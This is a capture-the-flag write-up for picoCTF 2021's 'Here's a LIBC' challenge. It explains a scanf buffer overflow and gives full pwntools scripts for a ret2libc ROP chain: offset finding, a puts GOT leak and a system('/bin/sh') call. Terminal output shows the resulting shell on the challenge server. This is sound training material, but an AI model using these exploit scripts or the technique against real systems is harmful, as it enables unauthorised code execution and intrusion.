# Here's a LIBC

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information
```
Points: 90
Tags: picoCTF 2021, Binary Exploitation
Author: MADSTACKS

Description:
I am once again asking for you to pwn this binary vuln libc.so.6 Makefile 

nc mercury.picoctf.net 24159

Hints:
1. PWNTools has a lot of useful features for getting offsets.
```

## Solution

### Analyse what was given

Contents of the `Makefile`
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ cat Makefile               
all:
        gcc -Xlinker -rpath=./ -m64 -fno-stack-protector -no-pie -o vuln vuln.c

clean:
        rm vuln
```

And general info on the binary file
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ file vuln    
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68 Symbols        No    0               0               vuln
```

The NX-bit is set which means no execution of code from the stack.

### Do a testrun of the binary

Lets try to run the binary
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ ./vuln               
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

Ah, that failed because of libc version inconsistencies
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ strings libc.so.6 | grep version
versionsort64
versionsort
argp_program_version_hook
gnu_get_libc_version
argp_program_version
RPC: Incompatible versions of RPC
RPC: Program/version mismatch
<malloc version="1">
Print program version
(PROGRAM ERROR) No version known!?
%s: %s; low version = %lu, high version = %lu
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
Compiled by GNU CC version 7.5.0.
.gnu.version
.gnu.version_d
.gnu.version_r

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ ldd --version                 
ldd (Debian GLIBC 2.36-4) 2.36
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

Provided Libc version is 2.27 instead of current 2.36.

The tool [pwninit](https://github.com/io12/pwninit) can fix this for us
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ ~/.cargo/bin/pwninit
bin: ./vuln
libc: ./libc.so.6
ld: ./ld-2.27.so

unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb
warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2)
copying ./vuln to ./vuln_patched
running patchelf on ./vuln_patched
writing solve.py stub
```

Now we have a patched binary that we can run
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ ./vuln_patched 
WeLcOmE To mY EcHo sErVeR!
sdfs
SdFs
picoCTF
PiCoCtF
^C
```

### Decompile in Ghidra

Next, lets decompile the file in [Ghidra](https://ghidra-sre.org/) and study the code.
Import the file in Ghidra and analyze it with the default settings.  
Double-click on the `main` function to show the decompiled version of it.
```C
void main(undefined4 param_1,undefined8 param_2)

{
  char cVar1;
  char acStack168 [24];
  undefined8 uStack144;
  undefined8 local_88;
  undefined4 local_7c;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined2 local_60;
  undefined local_5e;
  char *local_50;
  undefined8 local_48;
  ulong local_40;
  __gid_t local_34;
  ulong local_30;
  
  uStack144 = 0x40079c;
  local_88 = param_2;
  local_7c = param_1;
  setbuf(stdout,(char *)0x0);
  uStack144 = 0x4007a1;
  local_34 = getegid();
  uStack144 = 0x4007bb;
  setresgid(local_34,local_34,local_34);
  local_40 = 0x1b;
  local_78 = 0x20656d6f636c6557;
  local_70 = 0x636520796d206f74;
  local_68 = 0x6576726573206f68;
  local_60 = 0x2172;
  local_5e = 0;
  local_48 = 0x1a;
  local_50 = acStack168;
  for (local_30 = 0; local_30 < local_40; local_30 = local_30 + 1) {
    cVar1 = convert_case((int)*(char *)((long)&local_78 + local_30),local_30);
    local_50[local_30] = cVar1;
  }
  puts(local_50);
  do {
    do_stuff();
  } while( true );
}
```

The main logic seems to be in the `do_stuff` function
```C
void do_stuff(void)

{
  char cVar1;
  undefined local_89;
  char local_88 [112];
  undefined8 local_18;
  ulong local_10;
  
  local_18 = 0;
  __isoc99_scanf("%[^\n]",local_88);
  __isoc99_scanf(&DAT_0040093a,&local_89);
  for (local_10 = 0; local_10 < 100; local_10 = local_10 + 1) {
    cVar1 = convert_case((int)local_88[local_10],local_10);
    local_88[local_10] = cVar1;
  }
  puts(local_88);
  return;
}
```

The function uses `scanf` to read an unlimited amount of characters into the `local_88` buffer of length `112`.  
This allows us to overflow the buffer and perform a [ROP attack]((https://en.wikipedia.org/wiki/Return-oriented_programming)).

Ultimately we want to execute `system(/bin/sh)` to get a shell. But this will be done in stages.

### Stage 0 - Identify the offset to the return address

The first step in our exploitation is to find the offset to the return address of the `do_stuff` function.  
If we send a specific sequence of characters that is a [de Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) we can easily calculate the offset to the return address.

We will use [pwntools](https://docs.pwntools.com/en/stable/index.html) with the `cyclic` function that generates a de Bruijn sequence and then the `cyclic_find` function will calculate the offset for us.

```python
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("./vuln_patched", checksec=False)

# Set output level (critical, error, warning, info (default), debug)
context.log_level = "info"

PROMPT = b'WeLcOmE To mY EcHo sErVeR!\n'

def find_offset(payload):
    # Launch process
    p = process([exe.path])
    # Send the payload
    p.sendlineafter(PROMPT, payload)
    # Wait for the process to crash
    p.wait()
    # Read pattern from the coredump file and then print it
    pattern = p.corefile.read(p.corefile.sp, 4).decode()
    log.info(f"4-byte pattern is: {pattern}")
    # Calculate the offset and then print it
    offset = cyclic_find(pattern)  
    log.info(f"Offset is: {offset}")
    # Cleanup core files
    os.system("rm core.* > /dev/null")
    return offset

offset = find_offset(cyclic(200))
```

Running the script to get the offset
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ ~/python_venvs/pwntools/bin/python find_offset.py
[+] Starting local process '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched': pid 30888
[*] Process '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched' stopped with exit code -11 (SIGSEGV) (pid 30888)
[+] Parsing corefile...: Done
[*] '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/core.30888'
    Arch:      amd64-64-little
    RIP:       0x400770
    RSP:       0x7ffdc029aa78
    Exe:       '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched' (0x400000)
    Fault:     0x6261616b6261616a
[*] 4-byte pattern is: jaab
[*] Offset is: 136
```

We can see that the offset is `136`.

### Stage 1  - Calculate Libc base address

Next, we need to calculate the Libc base address with the help of a leaked address of the `puts` function.

In Linux, the first function argument is passed in the RDI-register according to the [calling conventions](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame).

Therefore, we need to find a `pop rdi`-gadget. We can use [Ropper](https://github.com/sashs/Ropper) for this
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ ~/python_venvs/ropper/bin/ropper -f vuln --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: vuln
0x0000000000400913: pop rdi; ret; 
```

The gadget is at address `0x400913`.

We expand our previous python script with a new function `find_libc_base`
```python
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("./vuln_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

# Set output level (critical, error, warning, info (default), debug)
context.log_level = "info"

PROMPT = b'WeLcOmE To mY EcHo sErVeR!\n'

def find_offset(payload):
    # Launch process
    p = process([exe.path])
    # Send the payload
    p.sendlineafter(PROMPT, payload)
    # Wait for the process to crash
    p.wait()
    # Read pattern from the coredump file and then print it
    pattern = p.corefile.read(p.corefile.sp, 4).decode()
    log.info(f"4-byte pattern is: {pattern}")
    # Calculate the offset and then print it
    offset = cyclic_find(pattern)  
    log.info(f"Offset is: {offset}")
    # Cleanup core files
    os.system("rm core.* > /dev/null")
    return offset


def find_libc_base():
    # From ropper
    pop_rdi = 0x400913

    # Build the payload
    payload = flat({
        offset: [
            pop_rdi,
            exe.got.puts,
            exe.plt.puts,
            exe.symbols.do_stuff
        ]
    })

    io.sendlineafter(PROMPT, payload)
    io.recvline()

    # Retrieve GOT puts address
    got_puts = unpack(io.recv()[:6].ljust(8, b'\x00'))
    log.info("Leaked GOT puts address: %#x", got_puts)

    # Subtract puts offset to get libc base
    libc_base = got_puts - libc.symbols.puts
    log.info("Libc base address: %#x", libc_base)
    return libc_base
    

offset = find_offset(cyclic(200))

io = process([exe.path])

# Stage 1 - Leak puts address to calculate Libc base
libc.address = find_libc_base()

io.close()

```

Run the sctipt to get the Libc base address
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ ~/python_venvs/pwntools/bin/python leak_libc_addr.py 
[+] Starting local process '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched': pid 79734
[*] Process '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched' stopped with exit code -11 (SIGSEGV) (pid 79734)
[+] Parsing corefile...: Done
[*] '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/core.79734'
    Arch:      amd64-64-little
    RIP:       0x400770
    RSP:       0x7fffa12416e8
    Exe:       '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched' (0x400000)
    Fault:     0x6261616b6261616a
[*] 4-byte pattern is: jaab
[*] Offset is: 136
[+] Starting local process '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched': pid 79743
[*] Leaked GOT puts address: 0x7f2ad6a80a30
[*] Libc base address: 0x7f2ad6a00000
[*] Stopped process '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched' (pid 79743)
```

We can see that the address of Libc (for this execution) was `0x7f2ad6a00000`.

### Stage 2 - Exploit with system(/bin/sh)

We expand our script even further with a call to `system(/bin/sh)` to get a shell
```python
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("./vuln_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

# Set output level (critical, error, warning, info (default), debug)
context.log_level = "info"

PROMPT = b'WeLcOmE To mY EcHo sErVeR!\n'

# Gadget(s) retrieved from ropper
pop_rdi = 0x400913

def find_offset(payload):
    # Launch process
    p = process([exe.path])
    # Send the payload
    p.sendlineafter(PROMPT, payload)
    # Wait for the process to crash
    p.wait()
    # Read pattern from the coredump file and then print it
    pattern = p.corefile.read(p.corefile.sp, 4).decode()
    log.info(f"4-byte pattern is: {pattern}")
    # Calculate the offset and then print it
    offset = cyclic_find(pattern)  
    log.info(f"Offset is: {offset}")
    # Cleanup core files
    os.system("rm core.* > /dev/null")
    return offset


def find_libc_base():
    # Build the payload
    payload = flat({
        offset: [
            pop_rdi,
            exe.got.puts,
            exe.plt.puts,
            exe.symbols.do_stuff
        ]
    })

    io.sendlineafter(PROMPT, payload)
    io.recvline()

    # Retrieve GOT puts address
    got_puts = unpack(io.recv()[:6].ljust(8, b'\x00'))
    log.info("Leaked GOT puts address: %#x", got_puts)

    # Subtract puts offset to get libc base
    libc_base = got_puts - libc.symbols.puts
    log.info("Libc base address: %#x", libc_base)
    return libc_base


def get_shell():
    # Prepare for system(/bin/sh) call
    log.info("System address: %#x", libc.symbols.system)
    bin_sh = next(libc.search(b'/bin/sh\x00'))
    log.info("/bin/sh address: %#x", bin_sh)

    # Payload to get shell
    payload = flat({
        offset: [
            pop_rdi,        # Dummy call (stack alignment)
            exe.got.puts,   # Dummy call (stack alignment)
            exe.plt.puts,   # Dummy call (stack alignment)
            pop_rdi,
            bin_sh,
            libc.symbols.system
        ]
    })

    io.sendline(payload)
    io.recvline()
    io.recvline()


offset = find_offset(cyclic(200))

io = remote('mercury.picoctf.net', 24159)

# Stage 1 - Leak puts address to calculate Libc base
libc.address = find_libc_base()

# Stage 2 - Exploit with system(/bin/sh)
get_shell()

io.interactive()
```

Now it's time to try the exploit on the remote system
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC]
└─$ ~/python_venvs/pwntools/bin/python exploit.py
[+] Starting local process '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched': pid 83467
[*] Process '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched' stopped with exit code -11 (SIGSEGV) (pid 83467)
[+] Parsing corefile...: Done
[*] '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/core.83467'
    Arch:      amd64-64-little
    RIP:       0x400770
    RSP:       0x7ffcdd40e398
    Exe:       '/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Heres_a_LIBC/vuln_patched' (0x400000)
    Fault:     0x6261616b6261616a
[*] 4-byte pattern is: jaab
[*] Offset is: 136
[+] Opening connection to mercury.picoctf.net on port 24159: Done
[*] Leaked GOT puts address: 0x7f47314dea30
[*] Libc base address: 0x7f473145e000
[*] System address: 0x7f47314ad4e0
[*] /bin/sh address: 0x7f47316120fa
[*] Switching to interactive mode
$ hostname
challenge-server-mercury
$ whoami
here-s-a-libc_5
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{<REDACTED>}$ 
$ 
[*] Interrupted
[*] Closed connection to mercury.picoctf.net port 24159
```

And there we have the flag.

For additional information, please see the references below.

## References

- [Wikipedia - NX bit](https://en.wikipedia.org/wiki/NX_bit)
- [Wikipedia - Return-oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming)
- [Wikipedia - de Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence)
- [Wikipedia - Global Offset Table](https://en.wikipedia.org/wiki/Global_Offset_Table)
- [Ghidra](https://ghidra-sre.org/)
- [pwninit](https://github.com/io12/pwninit)
- [pwntools](https://docs.pwntools.com/en/stable/index.html)
- [Ropper](https://github.com/sashs/Ropper)
